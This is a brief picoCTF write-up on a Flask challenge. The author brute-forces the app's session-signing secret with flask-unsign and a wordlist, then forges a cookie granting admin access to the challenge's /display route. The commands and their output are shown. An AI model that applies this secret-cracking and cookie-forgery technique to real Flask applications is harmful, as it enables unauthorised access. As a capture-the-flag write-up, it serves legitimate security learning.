# Flask Weak JWT 

picoCTF challenge 

A flask application had maintained a fixed list of cookies but `admin` was not part of it. JWT was used for authorization. So, the challenge was to modify the JWT to change its payload to `admin`.

**flask-unsign** was used to brute force the JWT to get the secret key

```bash
 $ flask-unsign --wordlist /usr/share/WordLists/rockyou.txt --unsign --cookie 'eyJ2ZXJ5X2F1dGgiOiJibGFuayJ9.Znoclg.C7RWGy9ySX7QTfPFZgBOMlPUSYU' --no-literal-eval
[*] Session decodes to: {'very_auth': 'blank'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 6272 attempts
b'fortune'

```

secret code was  `fortune`

Again modified the JWT payload using the same tool

```bash
$ flask-unsign --sign --cookie '{"very_auth":"admin"}' --secret 'fortune'             
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZnojOw.sH-UEhUiqjnjvOdtfX7Wv5X2nAA
```

used the obtained JWT signed token and made request to /display endpoint to get the flag

```py
@app.route("/display", methods=["GET"])
# goal is to set very_auth=admin
def flag():
	if session.get("very_auth"):
		check = session["very_auth"]
		if check == "admin":
			resp = make_response(render_template("flag.html", value=flag_value, title=title))
			return resp
		flash("That is a cookie! Not very special though...", "success")
		return render_template("not-flag.html", title=title, cookie_name=session["very_auth"])
	else:
		resp = make_response(redirect("/"))
		session["very_auth"] = "blank"
		return resp


```



## References

- https://stackoverflow.com/questions/77340063/flask-session-cookie-tampering
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask